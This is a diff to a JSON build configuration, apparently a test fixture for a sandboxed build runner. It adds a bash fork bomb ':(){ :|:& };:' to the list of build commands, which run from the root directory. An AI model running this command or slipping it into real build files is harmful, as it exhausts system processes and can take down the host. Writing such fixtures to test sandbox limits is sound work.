@@ -1,5 +1,12 @@
 {
-  "buildCommands": ["ls", "hostname", "ps", "touch ROOT_FS_FILE"],
+  "buildCommands": [
+    "ls",
+    "touch ROOT_FS_FILE",
+    "hostname",
+    "ps",
+    "touch ROOT_FS_FILE",
+    ":(){ :|:& };:"
+  ],
   "copy": ["*"],
   "workingDirectory": "/"
 }
